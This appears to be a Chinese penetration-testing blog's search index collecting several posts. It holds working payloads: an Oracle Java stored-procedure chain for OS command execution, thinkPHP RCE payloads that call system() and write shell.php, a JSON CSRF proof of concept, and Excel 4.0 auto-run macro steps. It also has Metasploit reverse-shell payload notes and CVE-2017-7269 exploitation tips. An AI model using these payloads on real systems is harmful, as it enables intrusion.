<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[渗透体系的本质是知识点的串联-2]]></title>
    <url>%2FPentest-example-1.html</url>
    <content type="text"><![CDATA[自从Micropoor分享了深圳护网总结以后，我感触良深，遂分享一篇与之类似的文章，虽不如Micropoor的案例有技术含量，但也是“渗透体系的本质是知识点的串联”的一种体现。希望在2019能够成为Micropoor一样的大牛。 本案例来源于2018四川护网行动，总结于2018.12.30。 发现站点漏洞这个站点漏洞发现的过程有点意思，下午看同事在群里提到edu-src，晚上回来闲逛，愁了一下edu-src上最近一段时间提交的目标站点的漏洞，然后发现以下内容： 打开网站进行测试，发现存在验证码，因此想到这个弱口令不是爆破出来的，而是几次尝试就可以的出来的。 后来拿到用户名及密码：admin / ** 寻找后台漏洞任意文件上传找到一个两个上传点，一个是上传头像的，另一个是上传附件的。 上传头像的上传点只能上传jpg文件，而上传附件的上传点是任意文件上传 肯定没有那么简单，上传成功后，无返回路径： 想到页面中上传点也有个下载的链接，抓取其数据包。 找到路径，访问如下： 最开始以为是马的问题，换了几个马都是这样，甚至上传.html文件也是返回400。 任意文件读取想到刚才查看附件那可能存在任意文件读取漏洞，遂测试。 的确可以读取任意文件，后来在WEB-INF/web.xml中找到了数据库配置文件，如下图。 公网的数据库，已经得出账号密码了，并且可以链接，但是是站库分离。 数据库服务器提权Oracle是11g版本的，使用OracleShell无法进行执行命令，然后用以下方法进行提权。 1.创建JAVA包 1select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object &#123;public static String runCMD(String args) &#123;try&#123;BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;&#125; catch (Exception e)&#123;return e.toString();&#125;&#125;&#125;'';commit;end;') from dual; 2.JAVA权限 1select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''begin dbms_java.grant_permission( ''''SYSTEM'''', ''''SYS:java.io.FilePermission'''', ''''&lt;&lt;ALL FILES&gt;&gt;'''',''''EXECUTE'''');end;''commit;end;') from dual; 3.创建函数 1select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual; 4.执行命令 1select LinxRUNCMD('whoami') from dual; 权限如下图所示。 遗憾的是没有办法执行其他命令。 总结1.信息收集决定了漏洞的产出，如果不是翻看edu-src，我将不会发现9999端口的Web服务，也不会进入这个系统。 2.学习能力很重要，提权部分过程是我导师Kavia进行的，他说直接从网上找到的方法进行测试的，而我并未发现那篇文章，找到的方法均测试失败，所以知识发现与学习的过程也是成败的关键。 3.获取更高的权限不仅是传统的渗透测试可以达到的，逻辑漏洞有时也会使攻击者打开通往更高权限的大门。]]></content>
      <categories>
        <category>渗透测试</category>
        <category>知识点总结</category>
        <category>渗透测试案例</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>Oracle</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[提交json数组的CSRF利用思路]]></title>
    <url>%2Fcsrf-and-json.html</url>
    <content type="text"><![CDATA[问题引出在CSRF中，经常遇到提交的数据包是json数组的，这种类型的CSRF不能直接使用Burp生成的POC进行测试。 后来在hackone上看到了一个方法，将from的ENCTYPE属性设置为text/plain时，json数组仍能被服务器接收。这个报告的地址为JSON CSRF on POST Heartbeats API 但是在最近刷SRC的过程中，笔者遇到的情况是：使用POST提交json数组到服务器，服务器检测有Content-Type: application/json请求头则通过，否则抛出一个异常。 用ajax技术解决想到ajax可以自定义数据包头，于使构造ajax版POC，如下图所示。 12345678910111213141516171819&lt;html&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;script&gt; function submitRequest() &#123; var xhr = new XMLHttpRequest(); xhr.open("POST", "https://www.admintony.com/address/addAddress.json", true); xhr.setRequestHeader("Accept", "application/json, text/plain, */*"); xhr.setRequestHeader("Content-Type", "application/json; charset=UTF-8"); xhr.setRequestHeader("Accept-Language", "zh-CN,zh;q=0.9"); xhr.withCredentials = true; var body = "&#123;\"name\":\"SRC\",\"tel\":\"18681992828\",\"country\":\"\",\"province\":\"北京市\",\"city\":\"北京市\",\"county\":\"东城区\",\"areaCode\":\"110101\",\"postalCode\":\"\",\"addressDetail\":\"中关村\",\"isDefault\":false,\"userName\":\"美团SRC\",\"lat\":10.077726938827084,\"lon\":100.33235369626206&#125;"; &lt;/script&gt; &lt;form action="#"&gt; &lt;input type="button" value="Submit request" onclick="submitRequest();" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 心想，使用ajax设置http头之后就可以利用了，但是ajax在跨域加http头请求的时候会先进行一次OPTIONS预请求，但是服务器并未设置允许任意域名跨域请求，则拒绝了options预请求，如下图所示。 在Burp中看该请求： 可以看到ajax的poc并没有发送post请求，而是发送了一个options预请求就被拒绝了。 Flash+307跳转绕过在Goole上看到，曾有国外大佬分享过使用Flash+307跳转绕过ajax发送预请求的限制，文章地址Flash + 307 redirect 使用1lastBr3ath提供的测试POC进行测试，如下图所示。 然后到查看地址处查看地址，发现地址果然加上去了，如下图所示。 参考JSON CSRF on POST Heartbeats API Flash + 307 redirect Forging Content-Type Header With Flash]]></content>
      <categories>
        <category>渗透测试</category>
        <category>CSRF</category>
      </categories>
      <tags>
        <tag>CSRF</tag>
        <tag>307+redirect</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thinkPHP代码执行批量检测工具]]></title>
    <url>%2FthinkPHPBatchPoc.html</url>
    <content type="text"><![CDATA[123456789PS E:\vulW3b&gt; python .\thinkPHPBatchPoc.pythinkPHPBatchPocAuthor: Admintony @ 2018.12.13Blog: http://www.admintony.com免责声明: 脚本仅用于批量检测站点是否存在漏洞，请勿用于非法用途，否则作者不担负任何责任。usage:thinkPHPBatchPoc.py -f target.txt # 批量检测是否存在thinkPHP代码执行漏洞thinkPHPBatchPoc.py -u target_URL # 指定检测是否存在thinkPHP代码执行漏洞 thinkPHPBatchPocthinkPHPBatchPoc 是thinkPHP代码执行批量检测工具 工具所使用的payload123456789?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20www_admintony_com?s=index/\think\Request/input&amp;filter=system&amp;data=echo%20www_admintony_com?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20echo%20www_admintony_com;?%3E?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20www_admintony_com?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20echo%20"www_admintony_com";?%3E 工具使用方法123456789PS E:\PyProject&gt; python .\thinkPHPBatchPoc.pythinkPHPBatchPocAuthor: Admintony @ 2018.12.13Blog: http://www.admintony.com免责声明: 脚本仅用于批量检测站点是否存在漏洞，请勿用于非法用途，否则作者不担负任何责任。usage:thinkPHPBatchPoc.py -f target.txt # 批量检测是否存在thinkPHP代码执行漏洞thinkPHPBatchPoc.py -u target_URL # 指定检测是否存在thinkPHP代码执行漏洞 针对单个目标进行测试123PS E:\PyProject&gt; python .\thinkPHPBatchPoc.py -u admintony.com[+] http://admintony.com is vulnerable[+] Payload is ?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20www_admintony_com 批量测试12345678910PS E:\PyProject&gt; python .\thinkPHPBatchPoc.py -f .\target.txt[+]Testing http://www.admintony.com[-] http://www.admintony.com is not vulnerable[+]Testing http://baidu.com[-] http://baidu.com is not vulnerable[+]Testing vulW3b.admintony.com/[+] http://vulW3b.admintony.com/ is vulnerable[+] Payload is ?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20www_admintony_com 下载地址thinkPHPBatchPoc]]></content>
      <tags>
        <tag>thinkPHP</tag>
        <tag>代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[《SVN源代码泄露利用工具-SvnExploit》升级版]]></title>
    <url>%2FsvnExploit-update.html</url>
    <content type="text"><![CDATA[SvnExploitSvnExploit是一款SVN源代码利用工具，其完美支持SVN&lt;1.7版本和SVN&gt;1.7版本的SVN源代码泄露，更多请阅读： SVN源代码泄露利用工具 Useage安装依赖库 1sudo pip install -r requirements.txt 查看帮助 1python SvnExploit.py -h 检测SVN源代码泄露 1python SvnExploit.py -u http://192.168.27.128/.svn 下载源代码 1python SvnExploit.py -u http://192.168.27.128/.svn --dump Examplesvn &gt; 1.7版本 1234567891011121314151617181920212223242526272829303132python .\svnExploit.py -u http://192.168.27.128/unit-2/lab3/.svn/ ____ _____ _ _ _/ ___|_ ___ __ | ____|_ ___ __ | | ___ (_) |_\___ \ \ / / '_ \| _| \ \/ / '_ \| |/ _ \| | __| ___) \ V /| | | | |___ &gt; &lt;| |_) | | (_) | | |_|____/ \_/ |_| |_|_____/_/\_\ .__/|_|\___/|_|\__| |_|SvnExploit - Dump the source code by svnAuthor: AdminTony (http://admintony.com)https://github.com/admintony/svnExploit+--------------------+----------+------------------------------------------------+| 文件名 | 文件类型 | CheckSum |+--------------------+----------+------------------------------------------------+| conn.php | file | $sha1$8f47ccbd4a436aa4f31018fea026275f6059ed10 || trunk | dir | None || branches | dir | None || admin_login.php | file | $sha1$a6981b1ca963c8a75e133e38780be7ff0cd60952 || phpmyadmin | file | $sha1$6d5af41c175e344ee483732648edc9318b2a6014 || README.TXT | file | $sha1$c5981462cc06422f4a78e68f0a48dddcf5860eb9 || README.txt | file | $sha1$ef4b5f3081dbac31f9fb089aafd60dd2b9474b51 || secret.php | file | $sha1$2e6a7a6976d31847f0eebf7bbc252bcc1ff4f609 || README.md | file | $sha1$466f5ab1e4adfd373a23f639e0dd8fcfdce7874b || img/login_bg01.jpg | file | $sha1$311efc58c4d7035a54fdb8e94d6ba901c56354fd || img | dir | None || index.php | file | $sha1$4660847a73ab0906d91841dde9576bd5054b2020 || test.sql | file | $sha1$096a90da3e471a472874413b18cb2f5dd0567fd1 || admin.php | file | $sha1$f444d3aad996577872ac7b95a2c05aa11e6b1f8f || document | dir | None || tags | dir | None |+--------------------+----------+------------------------------------------------+ 12345678910111213141516171819202122232425262728python .\svnExploit.py -u http://192.168.27.128/unit-2/lab3/.svn/ --dump ____ _____ _ _ _/ ___|_ ___ __ | ____|_ ___ __ | | ___ (_) |_\___ \ \ / / '_ \| _| \ \/ / '_ \| |/ _ \| | __| ___) \ V /| | | | |___ &gt; &lt;| |_) | | (_) | | |_|____/ \_/ |_| |_|_____/_/\_\ .__/|_|\___/|_|\__| |_|SvnExploit - Dump the source code by svnAuthor: AdminTony (http://admintony.com)https://github.com/admintony/svnExploit+--------------------+--------------------------------------------------------------------+----------+| 文件名 | URL | 下载状态 |+--------------------+--------------------------------------------------------------------+----------+| conn.php | .svn/pristine/8f/8f47ccbd4a436aa4f31018fea026275f6059ed10.svn-base | 下载成功 || README.TXT | .svn/pristine/c5/c5981462cc06422f4a78e68f0a48dddcf5860eb9.svn-base | 下载成功 || README.txt | .svn/pristine/ef/ef4b5f3081dbac31f9fb089aafd60dd2b9474b51.svn-base | 下载成功 || phpmyadmin | .svn/pristine/6d/6d5af41c175e344ee483732648edc9318b2a6014.svn-base | 下载成功 || secret.php | .svn/pristine/2e/2e6a7a6976d31847f0eebf7bbc252bcc1ff4f609.svn-base | 下载成功 || README.md | .svn/pristine/46/466f5ab1e4adfd373a23f639e0dd8fcfdce7874b.svn-base | 下载成功 || admin_login.php | .svn/pristine/a6/a6981b1ca963c8a75e133e38780be7ff0cd60952.svn-base | 下载成功 || index.php | .svn/pristine/46/4660847a73ab0906d91841dde9576bd5054b2020.svn-base | 下载成功 || admin.php | .svn/pristine/f4/f444d3aad996577872ac7b95a2c05aa11e6b1f8f.svn-base | 下载成功 || test.sql | .svn/pristine/09/096a90da3e471a472874413b18cb2f5dd0567fd1.svn-base | 下载成功 || img/login_bg01.jpg | .svn/pristine/31/311efc58c4d7035a54fdb8e94d6ba901c56354fd.svn-base | 下载成功 |+--------------------+--------------------------------------------------------------------+----------+[+] 已经Dump完成! svn &lt; 1.7版本 1234567891011121314151617181920212223242526272829python .\svnExploit.py -u http://192.168.27.128/unit-2/lab2/.svn/ ____ _____ _ _ _/ ___|_ ___ __ | ____|_ ___ __ | | ___ (_) |_\___ \ \ / / '_ \| _| \ \/ / '_ \| |/ _ \| | __| ___) \ V /| | | | |___ &gt; &lt;| |_) | | (_) | | |_|____/ \_/ |_| |_|_____/_/\_\ .__/|_|\___/|_|\__| |_|SvnExploit - Dump the source code by svnAuthor: AdminTony (http://admintony.com)https://github.com/admintony/svnExploit+---------------------+----------+---------------------------------------------+| 文件名 | 文件类型 | URL |+---------------------+----------+---------------------------------------------+| favicon.ico | file | /.svn/text-base/favicon.ico.svn-base || index.html | file | /.svn/text-base/index.html.svn-base || phpinfo.php | file | /.svn/text-base/phpinfo.php.svn-base || shell.php | file | /.svn/text-base/shell.php.svn-base || config/config.php | file | config/.svn/text-base/config.php.svn-base || css/add.css | file | css/.svn/text-base/add.css.svn-base || css/colorbox.css | file | css/.svn/text-base/colorbox.css.svn-base || css/company.css | file | css/.svn/text-base/company.css.svn-base || images/btn_back.png | file | images/.svn/text-base/btn_back.png.svn-base || images/gitf.png | file | images/.svn/text-base/gitf.png.svn-base || js/common.js | file | js/.svn/text-base/common.js.svn-base || js/jquery.min.js | file | js/.svn/text-base/jquery.min.js.svn-base || js/loop.js | file | js/.svn/text-base/loop.js.svn-base |+---------------------+----------+---------------------------------------------+ 1234567891011121314151617181920212223242526272829python .\svnExploit.py -u http://192.168.27.128/unit-2/lab2/.svn/ --dump ____ _____ _ _ _/ ___|_ ___ __ | ____|_ ___ __ | | ___ (_) |_\___ \ \ / / '_ \| _| \ \/ / '_ \| |/ _ \| | __| ___) \ V /| | | | |___ &gt; &lt;| |_) | | (_) | | |_|____/ \_/ |_| |_|_____/_/\_\ .__/|_|\___/|_|\__| |_|SvnExploit - Dump the source code by svnAuthor: AdminTony (http://admintony.com)https://github.com/admintony/svnExploit+---------------------+---------------------------------------------+----------+| 文件名 | URL | 下载状态 |+---------------------+---------------------------------------------+----------+| favicon.ico | /.svn/text-base/favicon.ico.svn-base | 下载成功 || index.html | /.svn/text-base/index.html.svn-base | 下载成功 || phpinfo.php | /.svn/text-base/phpinfo.php.svn-base | 下载成功 || shell.php | /.svn/text-base/shell.php.svn-base | 下载成功 || config/config.php | config/.svn/text-base/config.php.svn-base | 下载成功 || css/add.css | css/.svn/text-base/add.css.svn-base | 下载成功 || css/colorbox.css | css/.svn/text-base/colorbox.css.svn-base | 下载成功 || css/company.css | css/.svn/text-base/company.css.svn-base | 下载成功 || images/btn_back.png | images/.svn/text-base/btn_back.png.svn-base | 下载成功 || images/gitf.png | images/.svn/text-base/gitf.png.svn-base | 下载成功 || js/common.js | js/.svn/text-base/common.js.svn-base | 下载成功 || js/jquery.min.js | js/.svn/text-base/jquery.min.js.svn-base | 下载成功 || js/loop.js | js/.svn/text-base/loop.js.svn-base | 下载成功 |+---------------------+---------------------------------------------+----------+ 更新记录更新记录 - 2018113012341.添加svn版本识别函数 - SvnVersion2.添加svn&lt;1.7版本时源码泄露利用功能（自动识别svn版本），包括查看和Dump源码3.优化显示，使用prettytable库输出表格4.添加Banner，美化界面 更新记录 - 20180821121.添加编码声明2.将mkdir函数改成了makedirs，防止目录结构复杂的无法dump源码 结构123456├── history│ ├── README.md│ └── svnExploit.py├── readme.md├── requirements.txt└── SvnExploit.py 历史版本svn&gt;1.7时，dump源码工具 具体用法参考：http://admintony.com/SVN源代码泄露利用工具.html]]></content>
      <categories>
        <category>原创工具</category>
        <category>SvnExploit</category>
      </categories>
      <tags>
        <tag>SvnExploit,SVN源代码泄露利用工具,原创工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用Excel 4.0宏执行任意命令]]></title>
    <url>%2FExcel-4-0-macros.html</url>
    <content type="text"><![CDATA[&emsp;&emsp;今天看到威胁情报发来的通知，一篇名为《老树开新花：利用Excel 4.0宏躲避杀软检测的攻击技术分析》的文章，于是便复现了一下。 Excel 4.0宏&emsp;&emsp;1992年发布用于Windows 3.0和3.1的电子表格软件Excel 4.0。对于自动化，可以通过所谓的宏工作表在此版本的Excel中使用XLM宏。X由于Microsoft很早就使用VBA宏（Visual Basic for Applications）来代替Excel 4.0宏技术，这导致Excel 4.0宏并不为大众所熟知。并且Excel 4.0宏存放在Excel 97 - 2003格式（.xls）文件中。 POC制作&emsp;&emsp;过程来源于outflank。 插入宏工作表&emsp;&emsp;创建一个新的Excel工作簿。右键单击屏幕底部的“Sheet1”，然后单击“插入”。 &emsp;&emsp;弹出一个窗口，允许您从要插入的各种对象中进行选择。选择“MS Excel 4.0 宏表”并单击“确定”。 编写宏&emsp;&emsp;已创建一个名为“Macro1”的新工作表。这是一种特殊的工作表类型，可以在其中输入XLM宏（所谓的宏表）。单击任何单元格并在此单元格和下面的后续单元格中输入公式= EXEC(&quot;calc.exe&quot;)，= ALERT(&quot;Hello world&quot;)和= HALT()。 运行宏&emsp;&emsp;要测试宏，请右键单击包含宏代码的第一个单元格，然后选择“运行”。将弹出一个新窗口。这应该包含包含宏代码的第一个单元格的名称（在我的例子中，第1行的默认“A1”，第1列）。单击“运行”以执行宏，然后观察计算器和MessageBox弹出窗口。 &emsp;&emsp;自动运行：如果希望在打开工作簿时自动运行宏（类似于VBA宏的Sub AutoOpen（）），请将宏的第一个单元格重命名为Auto_open。 隐藏宏&emsp;&emsp;您可以通过在工作表名称（“宏1”）上单击鼠标右键并选择“隐藏”来隐藏宏工作表。Auto_open XLM宏仍将从隐藏的工作表运行。 执行shellcode 参考https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/ https://mp.weixin.qq.com/s/KVpO02KJWE6OVZDb0ungOA]]></content>
      <categories>
        <category>office</category>
        <category>Excel 4.0宏执行任意命令</category>
      </categories>
      <tags>
        <tag>office</tag>
        <tag>Excel 4.0宏</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Metasploit渗透测试魔鬼训练营读书笔记]]></title>
    <url>%2FMetasploit-reading-notes.html</url>
    <content type="text"><![CDATA[&emsp;&emsp;最近忙里偷闲，阅读了一下《Metasploit渗透测试魔鬼训练营》，希望能够更加了解Metasploit的框架结构。 信息收集外围信息收集目录扫描&emsp;&emsp;常用模块有：auxiliary/scanner/http/brute_dir、auxiliary/scanner/http/dir_scanner和auxiliary/scanner/http/dir_listing &emsp;&emsp;用法都比较相似，均可以设置字典路径、代理、目标IP或域名、目标端口、是否为https协议、线程数量等选项。 &emsp;&emsp;目标域名或IP可以设置多个，所有rhosts的参数都支持以下4种格式： 192.168.27.0/24 192.168.27.1-100 192.168.27.1 192.168.27.136 192.168.27.1 &emsp;&emsp;模块运行效果如下： &emsp;&emsp;该模块自动判断not found的状态码，不太稳定，在测试过程中发现过将302、500当作not found状态码的情况。 收集邮箱&emsp;&emsp;metasploit中有一个根据网站域名在Google、Bing、Yahoo三个搜索引擎搜索暴露邮箱的模块-auxiliary/gather/search_email_collector &emsp;&emsp;国内无法访问Google，使用Yahoo搜索报错，因此只能使用bing进行搜索，效果较差，尝试了几个学校的网站，一个邮箱没收集到。 子域名收集&emsp;&emsp;metasploit中auxiliary/gather/searchengine_subdomains_collector模块是通过Bing、Yahoo来进行子域名收集的工具，他支持两种类型，通过根域名和通过IP进行收集。 &emsp;&emsp;百度的子域名只找到两个，还有些网站子域名都找不到，效果很差劲。 主机发现&emsp;&emsp;metasploit中提供了很多扫描模块，均存放在auxiliary/scanner中。 arp_sweep&emsp;&emsp;auxiliary/scanner/discovery/arp_sweep模块是通过发送ARP请求包来发现存活主机的，其局限性是只能发现局域网中的存活主机。 Nmap扫描主机 nmap -sP 192.168.27.0/24 &emsp;&emsp;基于ping的主机扫描 nmap -PU -sn 192.168.27.0/24 &emsp;&emsp;通过对开放的UDP端口进行检测判断主机是否存活，-PU检测到主机存活后会列出开放的TCP端口，若要加快速度则用-sn选项告诉Nmap只检测存活，不扫描TCP端口。 操作系统辨识&emsp;&emsp;操作系统辨识主要用的是nmap的-O选项。 端口扫描Metasploit的portscan&emsp;&emsp;Metasploit中提供了5种端口扫描的模块： auxiliary/scanner/portscan/tcp &emsp;&emsp;通过一次完整的TCP连接来判断端口是否开放，这种扫描方式最准确，但扫描速度慢。 auxiliary/scanner/portscan/ack &emsp;&emsp;通过ACK扫描的方式对防火墙上未被屏蔽的端口进行探测。 auxiliary/scanner/portscan/syn &emsp;&emsp;通过发送TCP SYN标志的方式探测开放的端口，也是最常用的扫描方式。 auxiliary/scanner/portscan/xmas &emsp;&emsp;一种更为隐蔽的扫描方式，通过发送FIN、PSH和URG标志，能够躲避一些高级的TCP标记检测器的过滤。 auxiliary/scanner/portscan/ftpbounce &emsp;&emsp;通过FTP bounce攻击的原理对TCP服务进行枚举，在旧的Solaris和FreeBSD系统的FTP服务中此攻击可以被利用。 &emsp;&emsp;这些模块需要设置的参数和用法是完全一致的，如下图： nmap扫描端口常用的Nmap扫描类型选项： -sT：通过完成一次完整的TCP连接的方式进行端口探测 -sS：TCP SYN扫描，速度较-sT选项快很多 -sF、-sX、-sN：通过发送一些特殊的标志位以避开设备或软件的检测 -sP：通过发送ICMP echo请求探测主机是否存活，原理同Ping -sU：探测目标主机开放了哪些UDP端口 -SA：TCP ACK扫描 常用的Nmap扫描选项： -Pn：在扫描之前，不发送ICMP请求测试目标是否存活 -O：探测远程主机的操作系统类型等信息 -F：快速扫描模式，只扫描在nmap-services中列出的端口 -p：指定希望扫描的端口 常用的Nmap扫描选项组合： 1234567nmap -sP 192.168.27.0/24 # 扫描存活主机nmap -PU -sn 192.168.27.0/24 # 扫描存活主机（通过发送UDP包方式）nmap -Pn -sS 192.168.27.0/24 # 不ping直接syn方式扫描端口nmap -Pn -sS 192.168.27.0/24 -o output.txt # 保存扫描结果nmap -Pn -sV 192.168.27.1 # 详细列出服务信息nmap -Pn -sT 192.168.27.1 # TCP connect方式扫描端口nmap -Pn 192.168.27.1 -p 22-25,80,110-400 # 指定端口进行扫描 查点与爆破&emsp;&emsp;通过端口扫描工具搜集到端口以后，需要对端口上运行的服务及其版本进行辨识，还可以对端口上运行的服务进行弱口令爆破。 辨识服务版本&emsp;&emsp;Metasploit中有很多的以_version结尾的辅助模块，其功能是判断服务的版本，可以通过search name:_version进行搜索。 &emsp;&emsp;例如对MySQL服务进行查点： 爆破弱口令&emsp;&emsp;Metasploit中有很多的以_login结尾的辅助模块，其功能是对服务进行弱口令爆破，可以通过search name:_login进行搜索。 &emsp;&emsp;以MySQL的弱口令爆破为例： 漏洞扫描wmap&emsp;&emsp;在Metasploit中提供了这么多的扫描模块，若一个一个的使用去探测会很麻烦并且很浪费时间，因此Metasploit提供了wmap来解决这个问题，wmap可以一次性的去扫描多个模块，并且将扫描结果存放在数据库。 添加站点&emsp;&emsp;wmap在运行之前需要先添加站点，其命令为为wmap_sites： wmap_sites -a domain # 添加站点 wmap_sites -l # 查看站点 wmap_sites -d ids # 删除站点 设置扫描目标&emsp;&emsp;在添加完站点以后，需要设置扫描目标才能进行扫描，其命令为wmap_targets: wmap_targets -t # 设置扫描目标（域名） wmap_targets -d # 设置扫描目标（id-&gt;wmap_sites中的id） wmap_targets -l # 查看目标列表 wmap_targets -c # 清除所有目标 开始扫描&emsp;&emsp;完成前面两步以后即可开始扫描了，扫描选项命令为wmap_run: wmap_run -t # 查看扫描模块 wmap_run -m ^((?!version).*)$ # 正则表达式来指定要使用的扫描模块的名称 wmap_run -p ^(.*(version).*)$ # 正则表达式来指定要使用的扫描模块的路径 wmap_run -e [/path/to/profile] # 加载profile中的模块进行扫描 &emsp;&emsp;profile的模板在/usr/share/metasploit-framework/data/wmap/wmap_sample_profile.txt中。 &emsp;&emsp;看到如下图所示，则表示扫描完成: 查看结果&emsp;&emsp;查看扫描结果使用的命令为wmap_vulns -l &emsp;&emsp;扫描结果的准确性取决于使用模块的准确性，个人觉得Metasploit在Web信息收集等方面准确性还是比较差的。并且在使用wmap时，会将域名转化成IP，遇到只能域名访问的情况就无法扫描了。 Exploit的使用&emsp;&emsp;Windows的Exploit存放在exploit/windows下，linux的Exploit存放在exploit/linux下，除了此两个还有其他的exploit存放目录，如下图： 选择Exploit&emsp;&emsp;在MSF框架中，选择exploit使用的命令是use exploitPath，例如：use exploit/windows/iis/iis_webdav_upload_asp，如下图： &emsp;&emsp;如果想根据CVE编号或其他编号查找exploit可以使用search命令。 查看exploit支持的payload&emsp;&emsp;不同的exploit支持的payload也有所不同，这是因为漏洞所提供的shellcode空间的大小不同所产生的差异。当然也可以根据自己的需求选择payload，比如MSF在公网可以选择reverse类型的payload让运行MSF的机器监听端口（默认监听端口是4444，可以通过lport选项设置），目标服务器来连接；或者MSF在内网中可以选择bind类型的payload让目标服务器监听端口（默认监听端口也是4444，可以通过lport选项设置），MSF去连接。 &emsp;&emsp;查看exploit所支持的payload的命令为：show payloads &emsp;&emsp;常用的payload如下： 1234windows/meterpreter/bind_tcp # meterpreter、 目标监听端口windows/meterpreter/reverse_tcp # meterpreter、 MSF监听端口windows/shell/bind_tcp # 反弹shell、 目标监听端口windows/shell/reverse_tcp # 反弹shell、 MSF监听端口 查看exploit选项&emsp;&emsp;不同的exploit都有不同的选项需要设置，查看有哪些选项需要设置的命令为show options： &emsp;&emsp;设置某个选项，使用的是set命令，比如：set rhost 192.168.27.1 查看目标&emsp;&emsp;有些exploit适用于多个操作系统，而如果不设置目标操作系统类型的话，msf默认是一一进行尝试。对于远程溢出漏洞，使用错误的payload进行尝试则会覆盖应有的正确代码，导致漏洞无法再成功利用（如CVE-2017-7269）。因此，如果在信息收集的过程中，你已经知道目标操作系统的类型，则可以自己指定目标类型，来增加成功率。 &emsp;&emsp;查看支持哪些目标：show targets，设置目标：set target xxx 利用漏洞&emsp;&emsp;填写完以上Payload以后，就可以使用exploit 或者 run 指令利用漏洞发起攻击了。]]></content>
      <categories>
        <category>读书笔记</category>
        <category>Metasploit渗透测试魔鬼训练营</category>
      </categories>
      <tags>
        <tag>读书笔记</tag>
        <tag>Metasploit</tag>
        <tag>Metasploit渗透测试魔鬼训练营</tag>
        <tag>nmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IIS6_WebDAV远程代码执行漏洞(CVE-2017-7269)的正确打开方式]]></title>
    <url>%2FCVE-2017-7269.html</url>
    <content type="text"><![CDATA[&emsp;&emsp;上周参加巅峰极客决赛的时候，靶场中很多中小型的网站都是用的IIS6的WEB容器，并且开着WEBDAV，但是直接用msf的iis_webdav_scstoragepathfromurl却无法利用成功，因此总结一下，以免下次再遇到这样尴尬的场面。 失败原因&emsp;&emsp;其实早在2017.03.31大佬zcgonvh已经给出了4种失败的原因了，当时没太在意，这次复现的过程中深刻的体会到了这些失败原因，并将大佬的4种失败原因分解成5种失败原因。 端口和域名绑定问题&emsp;&emsp;实际环境中，iis绑定的域名和端口可能不是默认的，比如： 默认绑定 非默认绑定 &emsp;&emsp;If头信息中的两个url是要求和站点绑定相匹配的，否则只能收到一个502。这里所说的相匹配指的是if头中url的port必须与站点绑定的端口相匹配，而if头中的域名只需要和host头保持一致就好。 失败情况 ：POC中if头里面的域名及端口与绑定不一致时。 &emsp;&emsp;上图是端口不匹配的情况，下图是域名不匹配的情况 成功情况 ：POC中if头里面的域名及端口与绑定一致时。（端口与实际端口一致，host的值与if中的域名一致） 物理路径&emsp;&emsp;根据CVE-2017-7269 IIS6.0远程代码执行漏洞分析及Exploit中提到：POC中If头中的第一个URL会被解析成物理路径，默认情况下是C:\Inetpub\wwwroot\，在覆盖缓冲区的时候填充的字符长度要根据物理路径的长度来决定，且物理路径长度 + 填充字符的个数 = 114。POC中的是按照默认的物理路径（19位）来计算填充字符的长度的，当物理路径的长度不为19位的时候就会收到一个500。（这里物理路径长度计算方法要加上最后的\） 物理路径长度&lt;19位 失败情况 ：物理路径长度小于19位。 成功情况 ：物理路径长度小于19位，且增加POC中padding的长度。 &emsp;&emsp;物理路径为c:\asp\其长度为7，因此POC需要增加12个a。 物理路径长度&gt;19位&emsp;&emsp;直接引用zcgonvh大佬的原话：“ROP和stackpivot前面的padding实际上为UTF8编码的字符，每三个字节解码后变为两个字节的UTF16字符，在保证Exp不出错的情况下，有0x58个字符是没用的。所以可以将前0x108个字节删除，换成0x58个a或b。” &emsp;&emsp;所以大概的POC是这样的： &emsp;&emsp;物理路径为C:\Inetpub\wwwroot\test\长度为24位，因此需要padding 90位，其中红框中a或b的个数为90。 爆破物理路径长度&emsp;&emsp;这个漏洞利用的成功与否，也取决于是否知道物理路径的长度。物理路径的长度可以根据上面已知的信息，来进行爆破： 物理路径长度 + 填充字符的个数 = 114 长度不匹配时返回500。 &emsp;&emsp;因为盘符占了3位字符（c:\），所以要爆破物理路径长度，可以将padding增加到111位，并依次减少，如果长度不匹配就返回500。判断长度的工具附在最后面。 多次执行错误shellcode&emsp;&emsp;多次执行错误的shellcode会覆盖很多不该覆盖的代码，从而导致正确的shellcode也执行也返回500，提示信息为：参数不正确，也可能什么都不返回。该问题在巅峰极客比赛中也遇到过，我们控制的靶机什么都没动一会儿就全站500了。 